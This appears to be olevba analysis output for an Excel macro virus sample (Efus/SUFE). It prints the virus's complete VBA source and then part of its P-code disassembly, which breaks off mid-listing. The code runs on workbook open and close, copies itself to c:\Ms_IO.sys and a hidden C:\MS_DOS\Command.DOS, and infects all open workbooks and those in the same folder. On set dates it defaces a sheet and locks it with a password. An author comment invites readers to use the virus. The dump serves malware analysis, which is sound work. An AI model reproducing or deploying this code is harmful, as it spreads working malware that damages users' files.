olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Efus.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Efus.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Efus.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Efus.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Efus.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSExcel.Efus.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSExcel.Efus.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet6.cls 
in file: Virus.MSExcel.Efus.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SUFE.bas 
in file: Virus.MSExcel.Efus.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/SUFE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'\
'\Hello!Be sure to make good use of this piece of virus code.Good luck!
'\                                                           -SunUFeiEr
'\
Dim Modu
Dim Infected
Dim Code
Dim puJ
Sub Auto_open()
    On Error Resume Next
    Application.ScreenUpdating = False
    Call Option_Set
    Call Settle_C
    Application.ScreenUpdating = True
    Call Action
End Sub
Sub Auto_close()
    On Error Resume Next
    Call Action
    Call Action_End
End Sub
Sub Option_Set()
On Error Resume Next
    With Application
        .UserName = "SUFE"
        .AltStartupPath = "C:\MS_DOS"
        .EnableSound = False
        .RollZoom = False
    End With
End Sub
Sub Settle_C()
    Dim If_Settled As Boolean
    On Error Resume Next
    With Application.FileSearch
        .LookIn = "C:\MS_DOS"
        .FileName = "Command.dos"
        If .Execute > 0 Then
            If_Settled = True
        End If
    End With
    If If_Settled = True Then
        Application.MacroOptions Macro:="C:\MS_DOS\Command.DOS!Un_do", Description:="", _
            ShortcutKey:="u"
        Application.OnWindow = "C:\MS_DOS\Command.DOS!Action"
        Call CodeExport
        Exit Sub
    Else
        Call CodeExport
        On Error Resume Next
        MkDir ("c:\MS_DOS")
        Workbooks.Add
        Application.ActiveWorkbook.VBProject.VBComponents.Import ("c:\Ms_IO.sys")
        ActiveWorkbook.SaveAs FileName:="C:\MS_DOS\Command.DOS", FileFormat:=xlNormal
        ActiveWorkbook.Save
        ActiveWindow.Visible = False
    End If
    Application.MacroOptions Macro:="C:\MS_DOS\Command.DOS!Un_do", Description:="", _
        ShortcutKey:="u"
    Application.OnWindow = "C:\MS_DOS\Command.DOS!Action"
End Sub
Sub Action()
    On Error Resume Next
    Application.ScreenUpdating = False
    For puJ = 1 To Application.Workbooks.Count
        If (Application.Workbooks(puJ).FullName <> "C:\MS_DOS\Command.DOS" _
            And InStr(Application.Workbooks(puJ).FullName, "\") <> 0) Then
                Call CodeImport_Simple
        End If
    Next puJ
    Application.ScreenUpdating = True
    Call Punish
End Sub
Sub CodeExport()
    Dim i
    Dim hFile As Long
    On Error Resume Next
    i = 0
    For Each Modu In Application.VBE.ActiveVBProject.VBComponents
        i = i + 1
        If (Modu.Name = "SUFE") Then
            Code = Application.VBE.ActiveVBProject.VBComponents(i).CodeModule.Lines(1, Application.VBE.ActiveVBProject.VBComponents(i).CodeModule.CountOfLines)
            Code = "Attribute VB_Name = ""SUFE""" & Chr(13) & Code
        Exit For
        End If
    Next Modu
    hFile = FreeFile
    Open "c:\Ms_IO.sys" For Output Access Write As hFile
        Print #hFile, Code
    Close hFile
End Sub
Sub CodeImport()
    On Error Resume Next
    Infected = False
    For Each Modu In Application.ActiveWorkbook.VBProject.VBComponents
        If (Modu.Name = "SUFE") Then
            Infected = True
            Exit For
        End If
    Next Modu
    If Infected = False Then
        Application.ActiveWorkbook.VBProject.VBComponents.Import ("c:\Ms_IO.sys")
        Application.ActiveWorkbook.Save
    End If
End Sub
Sub CodeImport_Simple()
    On Error Resume Next
    Infected = False
    For Each Modu In Application.Workbooks(puJ).VBProject.VBComponents
        If (Modu.Name = "SUFE") Then
            Infected = True
            Exit For
        End If
    Next Modu
    If Infected = False Then
        Application.Workbooks(puJ).VBProject.VBComponents.Import ("c:\Ms_IO.sys")
        Application.Workbooks(puJ).Save
    End If
End Sub
Sub Action_End()
    Dim Bugee
    Dim BugerPath
    Dim FileOpened
    Dim i
    Dim j
    Application.ScreenUpdating = False
    BugerPath = ActiveWorkbook.Path
    Set Bugee = Application.FileSearch
        Bugee.NewSearch
        Bugee.LookIn = BugerPath
        Bugee.FileType = msoFileTypeExcelWorkbooks
        Bugee.SearchSubFolders = False
        If Bugee.Execute() > 0 Then
            For i = 1 To Bugee.FoundFiles.Count
                On Error GoTo Exitsub
                FileOpened = False
                For j = 1 To Application.Workbooks.Count
                    If CStr(Bugee.FoundFiles(i)) = CStr(Application.Workbooks(j).FullName) Then
                        FileOpened = True
                        Exit For
                    End If
                Next j
                If FileOpened = False Then
                    Workbooks.Open FileName:=Bugee.FoundFiles(i)
                    Call CodeImport
                    Application.ActiveWorkbook.Close
                End If
            Next i
        End If
        Application.ScreenUpdating = True
Exitsub:
End Sub
Sub Un_Do()
    With Application
        .UserName = ""
        .AltStartupPath = ""
        .EnableSound = False
        .RollZoom = False
    End With
        Application.OnWindow = ""
End Sub
Sub Punish()
    On Error Resume Next
    If ((Day(Date) = 1) Or (Day(Date) = 10)) And ((WeekDay(Date) = 7) Or (WeekDay(Date) = 1)) Then
        Application.ActiveWorkbook.Worksheets.Add before:=ActiveWorkbook.Worksheets(1)
        Application.ActiveWorkbook.Worksheets(1).Select
        Range("A1").Select
        Application.DisplayFullScreen = True
        Application.CommandBars("Full Screen").Visible = False
        With ActiveWindow
            .DisplayHeadings = False
            .DisplayOutline = False
            .DisplayZeros = False
            .DisplayHorizontalScrollBar = False
            .DisplayVerticalScrollBar = False
            .DisplayWorkbookTabs = False
            .DisplayGridlines = False
        End With
        ActiveWindow.WindowState = xlMaximized
        On Error GoTo theEnd
        Range("A1:Q32").Select
        Selection.ClearContents
        Selection.Borders(xlDiagonalDown).LineStyle = xlNone
        Selection.Borders(xlDiagonalUp).LineStyle = xlNone
        Selection.Borders(xlEdgeLeft).LineStyle = xlNone
        Selection.Borders(xlEdgeTop).LineStyle = xlNone
        Selection.Borders(xlEdgeBottom).LineStyle = xlNone
        Selection.Borders(xlEdgeRight).LineStyle = xlNone
        Selection.Borders(xlInsideVertical).LineStyle = xlNone
        Selection.Borders(xlInsideHorizontal).LineStyle = xlNone
        With Selection.Interior
            .ColorIndex = 19
            .Pattern = xlSolid
            .PatternColorIndex = xlAutomatic
        End With
        Selection.RowHeight = 20
        Selection.ColumnWidth = 7
        ActiveWindow.ScrollRow = 12
        Range("A1:a3").Select
        Selection.RowHeight = 10
        Range("A1:c1").Select
        Selection.ColumnWidth = 11
        Range("D5:F23").Select
        Selection.Borders(xlDiagonalDown).LineStyle = xlNone
        Selection.Borders(xlDiagonalUp).LineStyle = xlNone
        With Selection.Borders(xlEdgeLeft)
            .LineStyle = xlContinuous
            .Weight = xlThick
            .ColorIndex = 46
        End With
        With Selection.Borders(xlEdgeTop)
            .LineStyle = xlContinuous
            .Weight = xlThick
            .ColorIndex = 46
        End With
        With Selection.Borders(xlEdgeBottom)
            .LineStyle = xlContinuous
            .Weight = xlThick
            .ColorIndex = 46
        End With
        With Selection.Borders(xlEdgeRight)
            .LineStyle = xlContinuous
            .Weight = xlThick
            .ColorIndex = 46
        End With
        Selection.Borders(xlInsideVertical).LineStyle = xlNone
        Selection.Borders(xlInsideHorizontal).LineStyle = xlNone
        Range("D5:F23").Select
        With Selection.Interior
            .ColorIndex = 2
            .Pattern = xlSolid
            .PatternColorIndex = xlAutomatic
        End With
        Range("D5:F23").Select
        With Selection.Font
            .Name = "·ÂËÎ_GB2312"
            .FontStyle = "¼Ó´Ö"
            .Size = 18
            .Strikethrough = False
            .Superscript = False
            .Subscript = False
            .OutlineFont = False
            .Shadow = False
            .Underline = xlUnderlineStyleNone
            .ColorIndex = xlAutomatic
        End With
        Range("D19:D22").Select
        Selection.Font.Size = 14
        Selection.HorizontalAlignment = xlCenter
        Range("A1").Select
        Range("F8").Select
        ActiveCell.FormulaR1C1 = "ÎÄ"
        Range("F9").Select
        ActiveCell.FormulaR1C1 = "Ã÷"
        Range("F10").Select
        ActiveCell.FormulaR1C1 = ""
        Range("F11").Select
        ActiveCell.FormulaR1C1 = "·î"
        Range("F12").Select
        ActiveCell.FormulaR1C1 = "Ï×"
        Range("F13").Select
        ActiveCell.FormulaR1C1 = ""
        Range("F14").Select
        ActiveCell.FormulaR1C1 = ""
        Range("F15").Select
        ActiveCell.FormulaR1C1 = "ÍÅ"
        Range("F16").Select
        ActiveCell.FormulaR1C1 = "½á"
        Range("F17").Select
        ActiveCell.FormulaR1C1 = ""
        Range("F18").Select
        ActiveCell.FormulaR1C1 = "½ø"
        Range("F19").Select
        ActiveCell.FormulaR1C1 = "È¡"
        Range("F20").Select
        ActiveCell.FormulaR1C1 = ""
        Range("E6").Select
        ActiveCell.FormulaR1C1 = ""
        Range("E7").Select
        ActiveCell.FormulaR1C1 = ""
        Range("E8").Select
        ActiveCell.FormulaR1C1 = "ÇÚ"
        Range("E9").Select
        ActiveCell.FormulaR1C1 = "·Ü"
        Range("E10").Select
        ActiveCell.FormulaR1C1 = ""
        Range("E11").Select
        ActiveCell.FormulaR1C1 = "ÑÏ"
        Range("E12").Select
        ActiveCell.FormulaR1C1 = "½÷"
        Range("E13").Select
        ActiveCell.FormulaR1C1 = ""
        Range("E14").Select
        ActiveCell.FormulaR1C1 = ""
        Range("E15").Select
        ActiveCell.FormulaR1C1 = "Çó"
        Range("E16").Select
        ActiveCell.FormulaR1C1 = "Êµ"
        Range("E17").Select
        ActiveCell.FormulaR1C1 = ""
        Range("E18").Select
        ActiveCell.FormulaR1C1 = "´´"
        Range("E19").Select
        ActiveCell.FormulaR1C1 = "ÐÂ"
        Range("E20").Select
        ActiveCell.FormulaR1C1 = ""
        Range("E21").Select
        ActiveCell.FormulaR1C1 = ""
        Range("d19").Select
        ActiveCell.FormulaR1C1 = "S"
        Range("D20").Select
        ActiveCell.FormulaR1C1 = "U"
        Range("D21").Select
        ActiveCell.FormulaR1C1 = "F"
        Range("D22").Select
        ActiveCell.FormulaR1C1 = "E"
        Range("A1").Select
        ActiveSheet.Protect Password:="We11come", DrawingObjects:=True, Contents:=True, Scenarios:=True
theEnd:
    End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -         
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -         
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -         
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSExcel.Efus.xls
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 965 bytes
' _VBA_PROJECT_CUR/VBA/Sheet1 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet2 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet3 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet4 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet5 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet6 - 957 bytes
' _VBA_PROJECT_CUR/VBA/SUFE - 14313 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0001 "\"
' Line #1:
' 	QuoteRem 0x0000 0x0046 "\Hello!Be sure to make good use of this piece of virus code.Good luck!"
' Line #2:
' 	QuoteRem 0x0000 0x0046 "\                                                           -SunUFeiEr"
' Line #3:
' 	QuoteRem 0x0000 0x0001 "\"
' Line #4:
' 	Dim 
' 	VarDefn Modu
' Line #5:
' 	Dim 
' 	VarDefn Infected
' Line #6:
' 	Dim 
' 	VarDefn Code
' Line #7:
' 	Dim 
' 	VarDefn puJ
' Line #8:
' 	FuncDefn (Sub Auto_open())
' Line #9:
' 	OnError (Resume Next) 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #11:
' 	ArgsCall (Call) Option_Set 0x0000 
' Line #12:
' 	ArgsCall (Call) Settle_C 0x0000 
' Line #13:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #14:
' 	ArgsCall (Call) Action 0x0000 
' Line #15:
' 	EndSub 
' Line #16:
' 	FuncDefn (Sub Auto_close())
' Line #17:
' 	OnError (Resume Next) 
' Line #18:
' 	ArgsCall (Call) Action 0x0000 
' Line #19:
' 	ArgsCall (Call) Action_End 0x0000 
' Line #20:
' 	EndSub 
' Line #21:
' 	FuncDefn (Sub Option_Set())
' Line #22:
' 	OnError (Resume Next) 
' Line #23:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #24:
' 	LitStr 0x0004 "SUFE"
' 	MemStWith UserName 
' Line #25:
' 	LitStr 0x0009 "C:\MS_DOS"
' 	MemStWith AltStartupPath 
' Line #26:
' 	LitVarSpecial (False)
' 	MemStWith EnableSound 
' Line #27:
' 	LitVarSpecial (False)
' 	MemStWith RollZoom 
' Line #28:
' 	EndWith 
' Line #29:
' 	EndSub 
' Line #30:
' 	FuncDefn (Sub Settle_C())
' Line #31:
' 	Dim 
' 	VarDefn If_Settled (As Boolean)
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #34:
' 	LitStr 0x0009 "C:\MS_DOS"
' 	MemStWith LookIn 
' Line #35:
' 	LitStr 0x000B "Command.dos"
' 	MemStWith FileName 
' Line #36:
' 	MemLdWith Execute 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #37:
' 	LitVarSpecial (True)
' 	St If_Settled 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	EndWith 
' Line #40:
' 	Ld If_Settled 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #41:
' 	LineCont 0x0004 0B 00 0C 00
' 	LitStr 0x001B "C:\MS_DOS\Command.DOS!Un_do"
' 	ParamNamed Macro 
' 	LitStr 0x0000 ""
' 	ParamNamed Description 
' 	LitStr 0x0001 "u"
' 	ParamNamed ShortcutKey 
' 	Ld Application 
' 	ArgsMemCall MacroOptions 0x0003 
' Line #42:
' 	LitStr 0x001C "C:\MS_DOS\Command.DOS!Action"
' 	Ld Application 
' 	MemSt OnWindow 
' Line #43:
' 	ArgsCall (Call) CodeExport 0x0000 
' Line #44:
' 	ExitSub 
' Line #45:
' 	ElseBlock 
' Line #46:
' 	ArgsCall (Call) CodeExport 0x0000 
' Line #47:
' 	OnError (Resume Next) 
' Line #48:
' 	LitStr 0x0009 "c:\MS_DOS"
' 	Paren 
' 	ArgsCall MkDir 0x0001 
' Line #49:
' 	Ld Workbooks 
' 	ArgsMemCall Add 0x0000 
' Line #50:
' 	LitStr 0x000C "c:\Ms_IO.sys"
' 	Paren 
' 	Ld Application 
' 	MemLd ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #51:
' 	LitStr 0x0015 "C:\MS_DOS\Command.DOS"
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	Ld ActiveWorkbook 
' 	ArgsMemCall SaveAs 0x0002 
' Line #52:
' 	Ld ActiveWorkbook 
' 	ArgsMemCall Save 0x0000 
' Line #53:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	MemSt Visible 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	LineCont 0x0004 0B 00 08 00
' 	LitStr 0x001B "C:\MS_DOS\Command.DOS!Un_do"
' 	ParamNamed Macro 
' 	LitStr 0x0000 ""
' 	ParamNamed Description 
' 	LitStr 0x0001 "u"
' 	ParamNamed ShortcutKey 
' 	Ld Application 
' 	ArgsMemCall MacroOptions 0x0003 
' Line #56:
' 	LitStr 0x001C "C:\MS_DOS\Command.DOS!Action"
' 	Ld Application 
' 	MemSt OnWindow 
' Line #57:
' 	EndSub 
' Line #58:
' 	FuncDefn (Sub Action())
' Line #59:
' 	OnError (Resume Next) 
' Line #60:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #61:
' 	StartForVariable 
' 	Ld puJ 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd Workbooks 
' 	MemLd Count 
' 	For 
' Line #62:
' 	LineCont 0x0004 0C 00 0C 00
' 	Ld puJ 
' 	Ld Application 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd FullName 
' 	LitStr 0x0015 "C:\MS_DOS\Command.DOS"
' 	Ne 
' 	Ld puJ 
' 	Ld Application 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd FullName 
' 	LitStr 0x0001 "\"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Ne 
' 	And 
' 	Paren 
' 	IfBlock 
' Line #63:
' 	ArgsCall (Call) CodeImport_Simple 0x0000 
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	StartForVariable 
' 	Ld puJ 
' 	EndForVariable 
' 	NextVar 
' Line #66:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #67:
' 	ArgsCall (Call) Punish 0x0000 
' Line #68:
' 	EndSub 
' Line #69:
' 	FuncDefn (Sub CodeExport())
' Line #70:
' 	Dim 
' 	VarDefn i
' Line #71:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #72:
' 	OnError (Resume Next) 
' Line #73:
' 	LitDI2 0x0000 
' 	St i 
' Line #74:
' 	StartForVariable 
' 	Ld Modu 
' 	EndForVariable 
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #75:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #76:
' 	Ld Modu 
' 	MemLd New 
' 	LitStr 0x0004 "SUFE"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #77:
' 	LitDI2 0x0001 
' 	Ld i 
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld i 
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Code 
' Line #78:
' 	LitStr 0x001A "Attribute VB_Name = "SUFE""
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Code 
' 	Concat 
' 	St Code 
' Line #79:
' 	ExitFor 
' Line #80:
' 	EndIfBlock 
' Line #81:
' 	StartForVariable 
' 	Ld Modu 
' 	EndForVariable 
' 	NextVar 
' Line #82:
' 	Ld Friend 
' 	St hFile 
' Line #83:
' 	LitStr 0x000C "c:\Ms_IO.sys"
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #84:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Code 
' 	PrintItemNL 
' Line #85:
' 	Ld hFile 
' 	Close 0x0001 
' Line #86:
' 	EndSub 
' Line #87:
' 	FuncDefn (Sub CodeImport())
' Line #88:
' 	OnError (Resume Next) 
' Line #89:
' 	LitVarSpecial (False)
' 	St Infected 
' Line #90:
' 	StartForVariable 
' 	Ld Modu 
' 	EndForVariable 
' 	Ld Application 
' 	MemLd ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #91:
' 	Ld Modu 
' 	MemLd New 
' 	LitStr 0x0004 "SUFE"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #92:
' 	LitVarSpecial (True)
' 	St Infected 
' Line #93:
' 	ExitFor 
' Line #94:
' 	EndIfBlock 
' Line #95:
' 	StartForVariable 
' 	Ld Modu 
' 	EndForVariable 
' 	NextVar 
' Line #96:
' 	Ld Infected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #97:
' 	LitStr 0x000C "c:\Ms_IO.sys"
' 	Paren 
' 	Ld Application 
' 	MemLd ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #98:
' 	Ld Application 
' 	MemLd ActiveWorkbook 
' 	ArgsMemCall Save 0x0000 
' Line #99:
' 	EndIfBlock 
' Line #100:
' 	EndSub 
' Line #101:
' 	FuncDefn (Sub CodeImport_Simple())
' Line #102:
' 	OnError (Resume Next) 
' Line #103:
' 	LitVarSpecial (False)
' 	St Infected 
' Line #104:
' 	StartForVariable 
' 	Ld Modu 
' 	EndForVariable 
' 	Ld puJ 
' 	Ld Application 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #105:
' 	Ld Modu 
' 	MemLd New 
' 	LitStr 0x0004 "SUFE"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #106:
' 	LitVarSpecial (True)
' 	St Infected 
' Line #107:
' 	ExitFor 
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	StartForVariable 
' 	Ld Modu 
' 	EndForVariable 
' 	NextVar 
' Line #110:
' 	Ld Infected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #111:
' 	LitStr 0x000C "c:\Ms_IO.sys"
' 	Paren 
' 	Ld puJ 
' 	Ld Application 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #112:
' 	Ld puJ 
' 	Ld Application 
' 	ArgsMemLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #113:
' 	EndIfBlock 
' Line #114:
' 	EndSub 
' Line #115:
' 	FuncDefn (Sub Action_End())
' Line #116:
' 	Dim 
' 	VarDefn Bugee
' Line #117:
' 	Dim 
' 	VarDefn BugerPath
' Line #118:
' 	Dim 
' 	VarDefn FileOpened
' Line #119:
' 	Dim 
' 	VarDefn i
' Line #120:
' 	Dim 
' 	VarDefn j
' Line #121:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #122:
' 	Ld ActiveWorkbook 
' 	MemLd Path 
' 	St BugerPath 
' Line #123:
' 	SetStmt 
' 	Ld Application 
' 	MemLd FileSearch 
' 	Set Bugee 
' Line #124:
' 	Ld Bugee 
' 	ArgsMemCall NewSearch 0x0000 
' Line #125:
' 	Ld BugerPath 
' 	Ld Bugee 
' 	MemSt LookIn 
' Line #126:
' 	Ld msoFileTypeExcelWorkbooks 
' 	Ld Bugee 
' 	MemSt FileType 
' Line #127:
' 	LitVarSpecial (False)
' 	Ld Bugee 
' 	MemSt SearchSubFolders 
' Line #128:
' 	Ld Bugee 
' 	ArgsMemLd Execute 0x0000 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #129:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Bugee 
' 	MemLd FoundFiles 
' 	MemLd Count 
' 	For 
' Line #130:
' 	OnError Exitsub 
' Line #131:
' 	LitVarSpecial (False)
' 	St FileOpened 
' Line #132:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd Workbooks 
' 	MemLd Count 
' 	For 
' Line #133:
' 	Ld i 
' 	Ld Bugee 
' 	ArgsMemLd FoundFiles 0x0001 
' 	Coerce (Str) 
' 	Ld j 
' 	Ld Application 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd FullName 
' 	Coerce (Str) 
' 	Eq 
' 	IfBlock 
' Line #134:
' 	LitVarSpecial (True)
' 	St FileOpened 
' Line #135:
' 	ExitFor 
' Line #136:
' 	EndIfBlock 
' Line #137:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #138:
' 	Ld FileOpened 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #139:
' 	Ld i 
' 	Ld Bugee 
' 	ArgsMemLd FoundFiles 0x0001 
' 	ParamNamed FileName 
' 	Ld Workbooks 
' 	ArgsMemCall Option 0x0001 
' Line #140:
' 	ArgsCall (Call) CodeImport 0x0000 
' Line #141:
' 	Ld Application 
' 	MemLd ActiveWorkbook 
' 	ArgsMemCall Close 0x0000 
' Line #142:
' 	EndIfBlock 
' Line #143:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #144:
' 	EndIfBlock 
' Line #145:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #146:
' 	Label Exitsub 
' Line #147:
' 	EndSub 
' Line #148:
' 	FuncDefn (Sub Un_Do())
' Line #149:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #150:
' 	LitStr 0x0000 ""
' 	MemStWith UserName 
' Line #151:
' 	LitStr 0x0000 ""
' 	MemStWith AltStartupPath 
' Line #152:
' 	LitVarSpecial (False)
' 	MemStWith EnableSound 
' Line #153:
' 	LitVarSpecial (False)
' 	MemStWith RollZoom 
' Line #154:
' 	EndWith 
' Line #155:
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt OnWindow 
' Line #156:
' 	EndSub 
' Line #157:
' 	FuncDefn (Sub Punish())
' Line #158:
' 	OnError (Resume Next) 
' Line #159:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	Paren 
' 	Or 
' 	Paren 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0007 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #160:
' 	LitDI2 0x0001 
' 	Ld ActiveWorkbook 
' 	ArgsMemLd Worksheets 0x0001 
' 	ParamNamed before 
' 	Ld Application 
' 	MemLd ActiveWorkbook 
' 	MemLd Worksheets 
' 	ArgsMemCall Add 0x0001 
' Line #161:
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd ActiveWorkbook 
' 	ArgsMemLd Worksheets 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #162:
' 	LitStr 0x0002 "A1"
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #163:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayFullScreen 
' Line #164:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Full Screen"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #165:
' 	StartWithExpr 
' 	Ld ActiveWindow 
' 	With 
' Line #166:
' 	LitVarSpecial (False)
' 	MemStWith DisplayHeadings 
' Line #167:
' 	LitVarSpecial (False)
' 	MemStWith DisplayOutline 
' Line #168:
' 	LitVarSpecial (False)
' 	MemStWith DisplayZeros 
' Line #169:
' 	LitVarSpecial (False)
' 	MemStWith DisplayHorizontalScrollBar 
' Line #170:
' 	LitVarSpecial (False)
' 	MemStWith DisplayVerticalScrollBar 
' Line #171:
' 	LitVarSpecial (False)
' 	MemStWith DisplayWorkbookTabs 
' Line #172:
' 	LitVarSpecial (False)
' 	MemStWith DisplayGridlines 
' Line #173:
' 	EndWith 
' Line #174:
' 	Ld xlMaximized 
' 	Ld ActiveWindow 
' 	MemSt WindowState 
' Line #175:
' 	OnError theEnd 
' Line #176:
